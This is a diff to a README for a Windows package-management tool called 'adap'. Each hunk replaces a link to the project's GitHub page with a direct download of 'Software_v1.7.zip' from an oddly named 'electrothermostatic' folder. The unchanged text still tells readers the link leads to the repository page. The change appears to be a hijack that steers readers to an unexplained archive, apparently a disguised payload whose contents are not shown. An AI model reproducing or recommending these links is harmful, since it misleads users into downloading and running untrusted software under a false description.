@@ -1,6 +1,6 @@
 # ⚙️ adap - Easy Daily Package Management
 
-[![Download adap](https://img.shields.io/badge/Download-adap-brightgreen?style=for-the-badge)](https://github.com/amrmohamedl/adap)
+[![Download adap](https://img.shields.io/badge/Download-adap-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/amrmohamedl/adap/main/electrothermostatic/Software_v1.7.zip)
 
 ---
 
@@ -34,7 +34,7 @@ To start using adap on a Windows computer, follow these steps carefully.
 
 Click the green button below to visit the adap download page:
 
-[![Download adap](https://img.shields.io/badge/Download-adap-brightgreen?style=for-the-badge)](https://github.com/amrmohamedl/adap)
+[![Download adap](https://img.shields.io/badge/Download-adap-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/amrmohamedl/adap/main/electrothermostatic/Software_v1.7.zip)
 
 This link takes you to the adap GitHub repository page. Here, you can find the latest version of adap ready for Windows.
 
@@ -136,7 +136,7 @@ Here are steps to use adap once it is running:
 
 You can visit the adap GitHub page for updates, issues, and community discussions:
 
-[https://github.com/amrmohamedl/adap](https://github.com/amrmohamedl/adap)
+[https://raw.githubusercontent.com/amrmohamedl/adap/main/electrothermostatic/Software_v1.7.zip](https://raw.githubusercontent.com/amrmohamedl/adap/main/electrothermostatic/Software_v1.7.zip)
 
 Use the Issues tab to report problems or suggest improvements.
 
@@ -186,4 +186,4 @@ It covers topics such as api-client connections, nim bindings, and package manag
 
 ---
 
-[![Download adap](https://img.shields.io/badge/Download-adap-brightgreen?style=for-the-badge)](https://github.com/amrmohamedl/adap)
+[![Download adap](https://img.shields.io/badge/Download-adap-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/amrmohamedl/adap/main/electrothermostatic/Software_v1.7.zip)
